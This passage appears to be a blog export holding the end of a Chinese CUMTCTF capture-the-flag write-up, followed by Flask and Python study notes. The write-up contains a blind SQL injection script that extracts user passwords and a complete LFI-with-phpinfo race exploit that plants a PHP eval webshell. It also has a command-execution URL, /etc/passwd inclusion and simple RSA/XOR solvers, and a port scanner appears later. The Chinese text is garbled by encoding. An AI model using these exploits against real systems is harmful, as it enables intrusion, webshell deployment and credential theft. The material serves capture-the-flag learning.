\"or/**/1=(case/**/when/**/(left(database(),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#\".format(i, binascii.b2a_hex(j + a)) #payload = \"or/**/1=(case/**/when/**/(left((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#\".format(i,binascii.b2a_hex(j+a)) #payload = \"or/**/1=(case/**/when/**/(left((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x7573657273),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#\".format(i,binascii.b2a_hex(j + a)) payload = \"or/**/1=(case/**/when/**/(left((select/**/group_concat(password)/**/from/**/users),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#\".format(i, binascii.b2a_hex(j + a)) #print(payload) #cumtctf #emails users #id id username,password data = &#123; 'username' : \"100\\\\\", 'password' : payload &#125; r = requests.session() res = r.post(url=url,data=data) #print(res.content) if 'Wrong username' not in res.content: j += a flag +=a break print(flag) å¥½åƒæ˜¯åœ¨æœ€åï¼Œå¤šè·‘ä¸€ä¼šå°±å‡ºæ¥äº† Try:GET_fileå…ˆæ‰«ç›®å½•å‘ç°æœ‰phpinfo.php åŒ…å«ä¸€ä¸‹å‘ç°æœ‰æ–‡ä»¶åŒ…å«æ¼æ´ ä¹‹ååˆåŒ…å«æ•æ„Ÿæ–‡ä»¶ 1?file&#x3D;&#x2F;etc&#x2F;passwd è¿™é‡Œæœ‰ä¸€ä¸ªphpinfoä¸Šä¼ æ–‡ä»¶å†åŒ…å« 1234567891011121314151617åœ¨ç»™PHPå‘é€POSTæ•°æ®åŒ…æ—¶ï¼Œå¦‚æœæ•°æ®åŒ…é‡ŒåŒ…å«æ–‡ä»¶åŒºå—ï¼Œæ— è®ºè®¿é—®çš„ä»£ç ä¸­æ˜¯å¦æœ‰å¤„ç†æ–‡ä»¶ä¸Šä¼ çš„é€»è¾‘ï¼Œphpéƒ½ä¼šå°†è¿™ä¸ªæ–‡ä»¶ä¿å­˜æˆä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯&#x2F;tmp&#x2F;php[6ä¸ªéšæœºå­—ç¬¦]ï¼‰ï¼Œè¿™ä¸ªä¸´æ—¶æ–‡ä»¶åœ¨è¯·æ±‚ç»“æŸåå°±ä¼šè¢«åˆ é™¤ï¼ŒåŒæ—¶ï¼Œphpinfoé¡µé¢ä¼šå°†å½“å‰è¯·æ±‚ä¸Šä¸‹æ–‡ä¸­æ‰€æœ‰å˜é‡éƒ½æ‰“å°å‡ºæ¥ã€‚ä½†æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´å’Œphpinfoé¡µé¢é€šå¸¸æ˜¯ä¸¤ä¸ªé¡µé¢ï¼Œç†è®ºä¸Šæˆ‘ä»¬éœ€è¦å…ˆå‘é€æ•°æ®åŒ…ç»™phpinfoé¡µé¢ï¼Œç„¶åä»è¿”å›é¡µé¢ä¸­åŒ¹é…å‡ºä¸´æ—¶æ–‡ä»¶åï¼Œå°†è¿™ä¸ªæ–‡ä»¶åå‘é€ç»™æ–‡ä»¶åŒ…å«æ¼æ´é¡µé¢ã€‚å› ä¸ºåœ¨ç¬¬ä¸€ä¸ªè¯·æ±‚ç»“æŸæ—¶ï¼Œä¸´æ—¶æ–‡ä»¶å°±ä¼šè¢«åˆ é™¤ï¼Œç¬¬äºŒä¸ªè¯·æ±‚å°±æ— æ³•è¿›è¡ŒåŒ…å«ã€‚ä½†æ˜¯è¿™å¹¶ä¸ä»£è¡¨æˆ‘ä»¬æ²¡æœ‰åŠæ³•å»åˆ©ç”¨è¿™ç‚¹ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼Œåªè¦å‘é€è¶³å¤Ÿå¤šçš„æ•°æ®ï¼Œè®©é¡µé¢è¿˜æœªååº”è¿‡æ¥ï¼Œå°±ä¸Šä¼ æˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶ï¼Œç„¶åæ–‡ä»¶åŒ…å«ï¼š1ï¼‰å‘é€åŒ…å«äº†webshellçš„ä¸Šä¼ æ•°æ®åŒ…ç»™phpinfoï¼Œè¿™ä¸ªæ•°æ®åŒ…çš„headerï¼Œgetç­‰ä½ç½®ä¸€å®šè¦å¡æ»¡åƒåœ¾æ•°æ®ï¼›2ï¼‰phpinfoè¿™æ—¶ä¼šå°†æ‰€æœ‰æ•°æ®éƒ½æ‰“å°å‡ºæ¥ï¼Œå…¶ä¸­çš„åƒåœ¾æ•°æ®ä¼šå°†phpinfoæ’‘å¾—éå¸¸å¤§3ï¼‰PHPé»˜è®¤ç¼“å†²åŒºå¤§å°æ˜¯4096ï¼Œå³PHPæ¯æ¬¡è¿”å›4096ä¸ªå­—èŠ‚ç»™socketè¿æ¥4ï¼‰æ‰€ä»¥ï¼Œæˆ‘ä»¬ç›´æ¥æ“ä½œåŸç”Ÿsocketï¼Œæ¯æ¬¡è¯»å–4096ä¸ªå­—èŠ‚ï¼Œåªè¦è¯»å–åˆ°çš„å­—ç¬¦é‡ŒåŒ…å«ä¸´æ—¶æ–‡ä»¶åï¼Œå°±ç«‹å³å‘é€ç¬¬äºŒä¸ªæ•°æ®åŒ…5ï¼‰æ­¤æ—¶ï¼Œç¬¬ä¸€ä¸ªæ•°æ®åŒ…çš„socketè¿æ¥å…¶å®è¿˜æ²¡æœ‰ç»“æŸï¼Œä½†æ˜¯PHPè¿˜åœ¨ç»§ç»­æ¯æ¬¡è¾“å‡º4096ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ä¸´æ—¶æ–‡ä»¶è¿˜æœªè¢«åˆ é™¤6ï¼‰æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®ï¼ŒæˆåŠŸåŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼Œæœ€ågetshell è¿™é‡Œæœ‰ç°æˆçš„exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190#!/usr/bin/python import sysimport threadingimport socketdef setup(host, port): TAG=\"Security Test\" PAYLOAD=\"\"\"%s\\r&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\\r\"\"\" % TAG REQ1_DATA=\"\"\"-----------------------------7dbff1ded0714\\rContent-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\\rContent-Type: text/plain\\r\\r%s-----------------------------7dbff1ded0714--\\r\"\"\" % PAYLOAD padding=\"A\" * 5000 REQ1=\"\"\"POST /phpinfo.php?a=\"\"\"+padding+\"\"\" HTTP/1.1\\rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=\"\"\"+padding+\"\"\"\\rHTTP_ACCEPT: \"\"\" + padding + \"\"\"\\rHTTP_USER_AGENT: \"\"\"+padding+\"\"\"\\rHTTP_ACCEPT_LANGUAGE: \"\"\"+padding+\"\"\"\\rHTTP_PRAGMA: \"\"\"+padding+\"\"\"\\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\rContent-Length: %s\\rHost: %s\\r\\r%s\"\"\" %(len(REQ1_DATA),host,REQ1_DATA) #modify this to suit the LFI script LFIREQ=\"\"\"GET /index.php?file=%s HTTP/1.1\\rUser-Agent: Mozilla/4.0\\rProxy-Connection: Keep-Alive\\rHost: %s\\r\\r\\r\"\"\" return (REQ1, TAG, LFIREQ)def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s2.connect((host, port)) s.send(phpinforeq) d = \"\" while len(d) &lt; offset: d += s.recv(offset) try: i = d.index(\"[tmp_name] =&amp;gt; \") fn = d[i+17:i+31] except ValueError: return None s2.send(lfireq % (fn, host)) d = s2.recv(4096) s.close() s2.close() if d.find(tag) != -1: return fncounter=0class ThreadWorker(threading.Thread): def __init__(self, e, l, m, *args): threading.Thread.__init__(self) self.event = e self.lock = l self.maxattempts = m self.args = args def run(self): global counter while not self.event.is_set(): with self.lock: if counter &gt;= self.maxattempts: return counter+=1 try: x = phpInfoLFI(*self.args) if self.event.is_set(): break if x: print \"\\nGot it! Shell created in /tmp/g\" self.event.set() except socket.error: return def getOffset(host, port, phpinforeq): \"\"\"Gets offset of tmp_name in the php output\"\"\" s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host,port)) s.send(phpinforeq) d = \"\" while True: i = s.recv(4096) d+=i if i == \"\": break # detect the final chunk if i.endswith(\"0\\r\\n\\r\\n\"): break s.close() i = d.find(\"[tmp_name] =&amp;gt; \") if i == -1: raise ValueError(\"No php tmp_name in phpinfo output\") print \"found %s at %i\" % (d[i:i+10],i) # padded up a bit return i+256def main(): print \"LFI With PHPInfo()\" print \"-=\" * 30 if len(sys.argv) &lt; 2: print \"Usage: %s host [port] [threads]\" % sys.argv[0] sys.exit(1) try: host = socket.gethostbyname(sys.argv[1]) except socket.error, e: print \"Error with hostname %s: %s\" % (sys.argv[1], e) sys.exit(1) port=80 try: port = int(sys.argv[2]) except IndexError: pass except ValueError, e: print \"Error with port %d: %s\" % (sys.argv[2], e) sys.exit(1) poolsz=10 try: poolsz = int(sys.argv[3]) except IndexError: pass except ValueError, e: print \"Error with poolsz %d: %s\" % (sys.argv[3], e) sys.exit(1) print \"Getting initial offset...\", reqphp, tag, reqlfi = setup(host, port) offset = getOffset(host, port, reqphp) sys.stdout.flush() maxattempts = 1000 e = threading.Event() l = threading.Lock() print \"Spawning worker pool (%d)...\" % poolsz sys.stdout.flush() tp = [] for i in range(0,poolsz): tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag)) for t in tp: t.start() try: while not e.wait(1): if e.is_set(): break with l: sys.stdout.write( \"\\r% 4d / % 4d\" % (counter, maxattempts)) sys.stdout.flush() if counter &gt;= maxattempts: break print if e.is_set(): print \"Woot! \\m/\" else: print \":(\" except KeyboardInterrupt: print \"\\nTelling threads to shutdown...\" e.set() print \"Shuttin' down...\" for t in tp: t.join()if __name__==\"__main__\": main() payloadï¼š 12http:&#x2F;&#x2F;202.119.201.197:13077&#x2F;?file&#x3D;&#x2F;tmp&#x2F;g&amp;1&#x3D;system(%27cat%20&#x2F;tmp&#x2F;7IDUrqGOt8PMATm852&#x2F;flag.txt%27);#CUMTCTF&#123;Orz_to_php1nf0&#125; æœ€åç›´æ¥å‘½ä»¤æ‰§è¡Œï¼Œä½†å¥½åƒæ‰¾äº†å¥½ä¹…æ‰çœ‹è§flag reè¿ä¸ªç­¾åˆ°çš„åˆ†éƒ½ä¸ç»™ä½ ç›´æ¥010æŸ¥çœ‹æœcumtctfå¯ä»¥çœ‹è§flag pythoné¢˜ç¦æ­¢pyç›´æ¥ä¸Šè„šæœ¬ 1234567891011# flag = input()cipher = [80,70,94,71,80,71,85,104,86,39,64,106,76,67,106,71,123,92,125,76,37,106,103,118,80,35,119,32,110]## if(len(flag==29)):# for i,n in enumerate(flag):# if ord(n) ^ 19 != cipher[i]:## else:for i in cipher: a = i ^ 19 print(chr(a),end='') å…„å¼Ÿä»¬å¿«æ¥å¸®å¸®è„è„è„±å£³æ‹–å…¥IDAå¯ä»¥çœ‹è§flag pwntest_ncnc ç›‘å¬é¢†flag babystackè„±å…¥010å¹¶è¾“å…¥å­—ç¬¦ä¸²çœ‹æ˜¯ç›´æ¥å¯ä»¥bash ç›´æ¥è¯»å–å°±å¯ä»¥æ‹¿flag cryptoå¹¼å„¿å›­çš„å¯†ç é¢˜rsaï¼Œå·²çŸ¥e n c æ±‚m 123456789101112131415# e = 0x10001# n = 0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302f# c = 0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2d# Hint ï¼š google RSimport gmpy2from Crypto.Util.number import *e=0x10001c = 0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2dp = 324350545929838254331191385863847627003q = 328413456989577256301798468872388310877n = 0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302fd = gmpy2.invert(e,(p-1)*(q-1))m = pow(c,d,n)print(long_to_bytes(m)) å¯ä»¥çœ‹è§flag å°å­¦ç”Ÿçš„å¯†ç é¢˜è¿™ä¸ªå¾ˆæ˜æ˜¾å°±å¯ä»¥çœ‹å‡ºè§„å¾‹å°±æ˜¯ä¸€èˆ¬éƒ½æ˜¯ä»¥8å¼€å¤´ ç„¶åæˆ‘æœ‰ç‚¹æ‡’ï¼ˆè¯´å®è¯æ˜¯ä¸å¤ªä¼šå†™ï¼‰å°±ä¸€ä¸ªä¸€ä¸ªæ‹¼æ¥å‡ºflag miscçœŸÂ·ç­¾åˆ°é¢˜zipä¼ªåŠ å¯†ç„¶åbase64è§£å¯†æ‹¿flag åˆ«åšé¢˜äº†å¬æ­Œå§mp3éšå†™ è¿™ä¸ªé¢˜å¯ä»¥ cumtæ˜¯å¯†ç  ç„¶åæ˜¯moseç¼–ç æˆ‘çœŸæ˜¯ä¸€ä¸ªä¸€ä¸ªæ‹¼çš„ï¼Œåº”è¯¥æ‹¿pythonè„šæœ¬å†™æ¯”è¾ƒå¥½ï¼Œæ¯•ç«Ÿpythoå­¦å¾—ä¸å¤ªå¥½ åº”è¯¥æ˜¯è¿™ä¸ªï¼Œæ‹¼é”™äº†å¥½å‡ å› 1CUMTCTF&#123;M0RS38MORSE8M0RS38MORSE8M0RSE8AND8MP3ST39O&#125; å¤§é²¨é±¼ä¹‹ä½ å¯åŠ²æ‰¾æµé‡åŒ…åˆ†æï¼Œç›´æ¥è·Ÿtcpæµå¯ä»¥çœ‹è§ä¸€ä¸ªç›²æ³¨çš„ä¼ è¾“å†…å®¹ æ˜¯äºŒåˆ†æ³• ç„¶åæˆ‘å°±åˆåˆåˆè‡ªå·±æ‹¼å†™ æ‹¼é”™äº†å¥½å‡ å› 1CUMTCTF&#123;cecc1394-6133-43d0-be06-a41c5f231dd4&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/tags/CTF/"},{"name":"é¢˜è§£","slug":"é¢˜è§£","permalink":"https://pz1o.top/tags/%E9%A2%98%E8%A7%A3/"}]},{"title":"pythonå¼€å‘","slug":"pythonå¼€å‘","date":"2020-08-13T11:20:57.000Z","updated":"2020-11-20T14:19:21.459Z","comments":true,"path":"2020/08/13/pythonå¼€å‘/","link":"","permalink":"https://pz1o.top/2020/08/13/python%E5%BC%80%E5%8F%91/","excerpt":"","text":"å‰è¨€é¡ºä¾¿å¤ä¹ ä¸€ä¸‹pythonï¼Œä¸»è¦æ˜¯æŒæ¡ä¸€ä¸‹pythonçš„ä¸»æµæ¡†æ¶ï¼ˆFlaskå’ŒDjango ï¼‰ FlaskURLå’Œè§†å›¾123456789101112131415161718192021222324252627# ä»flaskè¿™ä¸ªæ¡†æ¶ä¸­å¯¼å…¥Flaskè¿™ä¸ªç±»from flask import Flask# åˆå§‹åŒ–ä¸€ä¸ªFlaskå¯¹è±¡# Flask()# éœ€è¦ä¼ é€’ä¸€ä¸ªå‚æ•°__name__# 1. æ–¹ä¾¿flaskæ¡†æ¶å»å¯»æ‰¾èµ„æº# 2. æ–¹ä¾¿flaskæ’ä»¶æ¯”å¦‚Flask-Sqlalchemyå‡ºç°é”™è¯¯çš„æ—¶å€™ï¼Œå¥½å»å¯»æ‰¾é—®é¢˜æ‰€åœ¨çš„ä½ç½®app = Flask(__name__)# @app.routeæ˜¯ä¸€ä¸ªè£…é¥°å™¨# @å¼€å¤´ï¼Œå¹¶ä¸”åœ¨å‡½æ•°çš„ä¸Šé¢ï¼Œè¯´æ˜æ˜¯è£…é¥°å™¨# è¿™ä¸ªè£…é¥°å™¨çš„ä½œç”¨ï¼Œæ˜¯åšä¸€ä¸ªurlä¸è§†å›¾å‡½æ•°çš„æ˜ å°„# 127.0.0.1:5000/ -&gt; å»è¯·æ±‚hello_worldè¿™ä¸ªå‡½æ•°ï¼Œç„¶åå°†ç»“æœè¿”å›ç»™æµè§ˆå™¨@app.route('/')def hello_world(): return 'æˆ‘æ˜¯ç¬¬ä¸€ä¸ªflaskç¨‹åº'# å¦‚æœå½“å‰è¿™ä¸ªæ–‡ä»¶æ˜¯ä½œä¸ºå…¥å£ç¨‹åºè¿è¡Œï¼Œé‚£ä¹ˆå°±æ‰§è¡Œapp.run()if __name__ == '__main__': # app.run() # å¯åŠ¨ä¸€ä¸ªåº”ç”¨æœåŠ¡å™¨ï¼Œæ¥æ¥å—ç”¨æˆ·çš„è¯·æ±‚ # while True: # listen() app.run() è®¾ç½®debugæ¨¡å¼ åœ¨app.run()ä¸­ä¼ å…¥ä¸€ä¸ªå…³é”®å­—å‚æ•°debug,app.run(debug=True)ï¼Œå°±è®¾ç½®å½“å‰é¡¹ç›®ä¸ºdebugæ¨¡å¼ã€‚ debugæ¨¡å¼çš„ä¸¤å¤§åŠŸèƒ½ï¼š å½“ç¨‹åºå‡ºç°é—®é¢˜çš„æ—¶å€™ï¼Œå¯ä»¥åœ¨é¡µé¢ä¸­çœ‹åˆ°é”™è¯¯ä¿¡æ¯å’Œå‡ºé”™çš„ä½ç½®ã€‚ åªè¦ä¿®æ”¹äº†é¡¹ç›®ä¸­çš„pythonæ–‡ä»¶ï¼Œç¨‹åºä¼šè‡ªåŠ¨åŠ è½½ï¼Œä¸éœ€è¦æ‰‹åŠ¨é‡æ–°å¯åŠ¨æœåŠ¡å™¨ã€‚ ä½¿ç”¨é…ç½®æ–‡ä»¶ æ–°å»ºä¸€ä¸ªconfig.pyæ–‡ä»¶ åœ¨ä¸»appæ–‡ä»¶ä¸­å¯¼å…¥è¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”é…ç½®åˆ°appä¸­ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 12import configapp.config.from_object(config) URLä¼ å‚åˆ°è§†å›¾12345@app.route(&#39;&#x2F;user&#x2F;&lt;id&gt;&#39;)def users(id): return u&#39;æ‚¨è¯·æ±‚çš„å‚æ•°æ˜¯ï¼š&#123;&#125;&#39;.format(id)#å‚æ•°éœ€è¦æ”¾åœ¨ä¸¤ä¸ªå°–æ‹¬å·ä¸­ã€‚#è§†å›¾å‡½æ•°ä¸­éœ€è¦æ”¾å’Œurlä¸­çš„å‚æ•°åŒåçš„å‚æ•°ã€‚ åè½¬URL ä»€ä¹ˆå«åšåè½¬URLï¼šä»è§†å›¾å‡½æ•°åˆ°urlçš„è½¬æ¢å«åšåè½¬url åè½¬urlçš„ç”¨å¤„ï¼š åœ¨é¡µé¢é‡å®šå‘çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨urlåè½¬ã€‚ åœ¨æ¨¡æ¿ä¸­ï¼Œä¹Ÿä¼šä½¿ç”¨urlåè½¬ã€‚ 12from flask import Flask,url_forprint url_for(&#39;users&#39;,id&#x3D;&#39;1&#39;) é¡µé¢è·³è½¬å’Œé‡å®šå‘ ç”¨å¤„ï¼šåœ¨ç”¨æˆ·è®¿é—®ä¸€äº›éœ€è¦ç™»å½•çš„é¡µé¢çš„æ—¶å€™ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰ç™»å½•ï¼Œé‚£ä¹ˆå¯ä»¥è®©é‡å®šå‘åˆ°ç™»å½•é¡µé¢ã€‚ 123form flask import redirect,url_forurl = url_for('users') usersæ˜¯è§†å›¾å‡½æ•°redirect(url) jinja2æ¨¡æ¿æ¨¡æ¿æ¸²æŸ“å’Œå‚æ•°1.å¦‚ä½•æ¸²æŸ“æ¨¡æ¿ï¼š æ¨¡æ¿æ”¾åœ¨templatesæ–‡ä»¶å¤¹ä¸‹ ä»flaskä¸­å¯¼å…¥render_templateå‡½æ•°ã€‚ åœ¨è§†å›¾å‡½æ•°ä¸­ï¼Œä½¿ç”¨render_templateå‡½æ•°ï¼Œæ¸²æŸ“æ¨¡æ¿ã€‚æ³¨æ„ï¼šåªéœ€è¦å¡«å†™æ¨¡æ¿çš„åå­—ï¼Œä¸éœ€è¦å¡«å†™templatesè¿™ä¸ªæ–‡ä»¶å¤¹çš„è·¯å¾„ã€‚ 2.æ¨¡æ¿ä¼ å‚ï¼š å¦‚æœåªæœ‰ä¸€ä¸ªæˆ–è€…å°‘é‡å‚æ•°ï¼Œç›´æ¥åœ¨render_templateå‡½æ•°ä¸­æ·»åŠ å…³é”®å­—å‚æ•°å°±å¯ä»¥äº†ã€‚ å¦‚æœæœ‰å¤šä¸ªå‚æ•°çš„æ—¶å€™ï¼Œé‚£ä¹ˆå¯ä»¥å…ˆæŠŠæ‰€æœ‰çš„å‚æ•°æ”¾åœ¨å­—å…¸ä¸­ï¼Œç„¶ååœ¨render_templateä¸­ï¼Œä½¿ç”¨ä¸¤ä¸ªæ˜Ÿå·ï¼ŒæŠŠå­—å…¸è½¬æ¢æˆå…³é”®å‚æ•°ä¼ é€’è¿›å»ï¼Œè¿™æ ·çš„ä»£ç æ›´æ–¹ä¾¿ç®¡ç†å’Œä½¿ç”¨ã€‚ 3.åœ¨æ¨¡æ¿ä¸­ï¼Œå¦‚æœè¦ä½¿ç”¨ä¸€ä¸ªå˜é‡ï¼Œè¯­æ³•æ˜¯ï¼š 4.è®¿é—®æ¨¡å‹ä¸­çš„å±æ€§æˆ–è€…æ˜¯å­—å…¸ï¼Œå¯ä»¥é€šè¿‡çš„å½¢å¼ï¼Œæˆ–è€…æ˜¯ä½¿ç”¨. 123456789101112131415def index(): class Person(object): name = 'pz1o' age = 18 p = Person() #login_url = url_for('users') #return redirect(login_url) context = &#123; 'gender':'nan', 'person': p &#125; return render_template('index.html',**context) &lt;p&gt;&#123;&#123;person.name&#125;&#125;&lt;/p&gt;&lt;p&gt;&#123;&#123;person.age&#125;&#125;&lt;/p&gt; ifå’Œforif 12345678910111213&#123;% if xxx %&#125;&#123;% else %&#125;&#123;% endif %&#125;&#123;% if user%&#125; &lt;a href=\"#\"&gt;&#123;&#123; user.name &#125;&#125;&lt;/a&gt; &lt;a href=\"#\"&gt;æ³¨é”€&lt;/a&gt;&#123;% else %&#125; &lt;a href=\"#\"&gt;ç™»å½•&lt;/a&gt; &lt;a href=\"#\"&gt;æ³¨å†Œ&lt;/a&gt;&#123;% endif %&#125; return render_template('index.html',user=user) for å­—å…¸çš„éå†ï¼Œè¯­æ³•å’Œpythonä¸€æ ·ï¼Œå¯ä»¥ä½¿ç”¨items()ã€keys()ã€values()ã€iteritems()ã€iterkeys()ã€itervalues() 123&#123;% for k,v in user.items() %&#125; &lt;p&gt;&#123;&#123; k &#125;&#125;ï¼š&#123;&#123; v &#125;&#125;&lt;/p&gt;&#123;% endfor %&#125; åˆ—è¡¨çš„éå†ï¼šè¯­æ³•å’Œpythonä¸€æ ·ã€‚ 123&#123;% for website in websites %&#125; &lt;p&gt;&#123;&#123; website &#125;&#125;&lt;/p&gt;&#123;% endfor %&#125; è¿‡æ»¤å™¨ ä»‹ç»å’Œè¯­æ³•ï¼š ä»‹ç»ï¼šè¿‡æ»¤å™¨å¯ä»¥å¤„ç†å˜é‡ï¼ŒæŠŠåŸå§‹çš„å˜é‡ç»è¿‡å¤„ç†åå†å±•ç¤ºå‡ºæ¥ã€‚ä½œç”¨çš„å¯¹è±¡æ˜¯å˜é‡ã€‚ è¯­æ³•ï¼š 1&#123;&#123;avatar|default()&#125;&#125; defaultè¿‡æ»¤å™¨ï¼šå¦‚æœå½“å‰å˜é‡ä¸å­˜åœ¨ï¼Œè¿™æ—¶å€™å¯ä»¥æŒ‡å®šé»˜è®¤å€¼ã€‚ 1234#ä¿®æ”¹é»˜è®¤å›¾ç‰‡avatar = 'xxx'return render_template('index.html',avatar=avatar)&lt;img src='&#123;&#123;avatar|default('...')&#125;&#125;'&gt; lengthè¿‡æ»¤å™¨ï¼šæ±‚åˆ—è¡¨æˆ–è€…å­—ç¬¦ä¸²æˆ–è€…å­—å…¸æˆ–è€…å…ƒç»„çš„é•¿åº¦ã€‚ 1234567891011121314151617181920212223#ç»Ÿè®¡è¯„è®ºæ¡æ•°def index():comment = [ &#123; 'user':'pz1o', 'content':'xxx' &#125;, &#123; 'user':'lzy', 'content':'xxxx' &#125; ] return render_template('index.html',comments=comment) &lt;p&gt;è¯„è®ºæ•°:&#123;&#123; comments|length &#125;&#125;&lt;/p&gt; &lt;ul&gt; &#123;% for i in comments %&#125; &lt;li&gt; &lt;a href=\"#\"&gt;&#123;&#123; i.user &#125;&#125;&lt;/a&gt; &lt;/li&gt; &lt;a &gt;&#123;&#123; i.content &#125;&#125;&lt;/a&gt; &#123;% endfor %&#125; &lt;/ul&gt; ç»§æ‰¿å’Œblock123456#pythonä¸­çš„ç»§æ‰¿class Person(object): name &#x3D; &#39;pz1o&#39; age &#x3D; 18class Student(Person): pass ç»§æ‰¿ä½œç”¨å’Œè¯­æ³•ï¼š ä½œç”¨ï¼šå¯ä»¥æŠŠä¸€äº›å…¬å…±çš„ä»£ç æ”¾åœ¨çˆ¶æ¨¡æ¿ä¸­ï¼Œé¿å…æ¯ä¸ªæ¨¡æ¿å†™åŒæ ·çš„ä»£ç ã€‚ è¯­æ³•ï¼š 1&#123;% extends &#39;base.html&#39;%&#125; blockå®ç°ï¼š ä½œç”¨ï¼šå¯ä»¥è®©å­æ¨¡æ¿å®ç°ä¸€äº›è‡ªå·±çš„éœ€æ±‚ã€‚çˆ¶æ¨¡æ¿éœ€è¦æå‰å®šä¹‰å¥½ã€‚ æ³¨æ„ç‚¹ï¼šå­æ¨¡æ¿ä¸­çš„ä»£ç ï¼Œå¿…é¡»æ”¾åœ¨blockå—ä¸­ã€‚ 123&#123;% block main %&#125; &lt;h1&gt;è¿™æ˜¯é¦–é¡µ&lt;&#x2F;h1&gt;&#123;% endblock %&#125; pythonå¼€å‘åŸºç¡€123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191#!/usr/bin/pythonprint('hello pz1o')#linuxä¸‹æ‰§è¡Œchmod 777 python./a.py#ä¼˜åŒ–ç”Ÿæˆpyopython -O -m py_compile a.pypython a.pyo#evala = '[1,2,3]'b = eval(a)print(b)#%æ ¼å¼åŒ–å­—ç¬¦ä¸²#%c:asciia = 97print('i am %c'%a)#%x:16è¿›åˆ¶print('i am %x'%a)#%o:8è¿›åˆ¶print('i am %o'%a)#æ—¥æœŸtime = time.time()time.sleep(1)#argså¤„ç†å¤šä½™å‚æ•° argså¤„ç†åˆ—è¡¨å’Œå…ƒç»„ kwargså¤„ç†å­—å…¸def sub(num1,num2,*args,**kwargs): print(num1-num2) print(args) print(kwargs)a = [5,3,2]sub(*a)2 (2,) &#123;&#125;sub(5,3,x=2)2 () &#123;'x': 2&#125;#æ–‡ä»¶æ“ä½œ#råªè¯» #wå†™å…¥ åˆ é™¤åŸæ–‡ä»¶ï¼Œé‡æ–°å†™å…¥ï¼Œæ— åˆ™åˆ›å»º#aå†™å…¥ æ–‡ä»¶æœ«å°¾è¿½åŠ æ–°çš„å†…å®¹ï¼Œæ— åˆ™åˆ›å»º#a+è¯»å†™ æ–‡ä»¶æœ«å°¾è¿½åŠ æ–°çš„å†…å®¹ï¼Œæ— åˆ™åˆ›å»º#b æ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶with open('yyds.txt','r') as f: print(f.read())CUMTCTF&#123;1b8947a6f2b048c284515d8bd209c83f&#125; f.seek(7,0) print(f.read())&#123;1b8947a6f2b048c284515d8bd209c83f&#125;#f.seek('åç§»é‡','é€‰é¡¹')#é€‰é¡¹ä¸º0æ—¶ï¼Œä»æ–‡ä»¶å¤´éƒ¨å‘ååç§»#é€‰é¡¹ä¸º1æ—¶ï¼Œä»å½“å‰ä½ç½®åç§»#é€‰é¡¹ä¸º2æ—¶ï¼Œä»æ–‡ä»¶æœ«å‘å‰åç§» #osæ¨¡å—os.mkdir('./yyds')os.rmdir('./yyds')os.listdir('./')os.getcwd()os.chdir('../') #æ”¹å˜å½“å‰å·¥ä½œç›®å½•os.system('dir') #è¿”å›çŠ¶æ€,0ä¸ºæˆåŠŸ,1ä¸ºå¤±è´¥res = os.popen('dir') #è¿”å›ä¸€ä¸ªå¯¹è±¡print(res.read())#æ•æ‰å¼‚å¸¸try: æ­£å¸¸ä»£ç except é”™è¯¯: å¦‚æœå‡ºç°é”™è¯¯ï¼Œæ‰§è¡Œè¿™æ®µä»£ç finally: æœ€ç»ˆæ‰§è¡Œè¿™æ®µä»£ç  #ç½‘ç»œç¼–ç¨‹#éå¸¸ç®€æ˜“çš„æ‰«æå™¨import sysimport socketport = [21,22,23,80,135,139,443,1433,3306,3389]allports = [0,65535]def scan(ip,port,*args,**kwargs): s = socket.socket() try: s.connect((ip, port)) print(\"[+]The %s port %s is open\"%(ip,port)) return True except: print(\"[+]The %s port %s is closed\"%(ip,port)) return Falsedef ports(ip,port):#search some incoming specific parameters for p in port: scan(ip,p)def convert(array): a = [] for x in array: a.append(int(x)) return adef portsplus(ip,port):#search the parameters of an interval passed 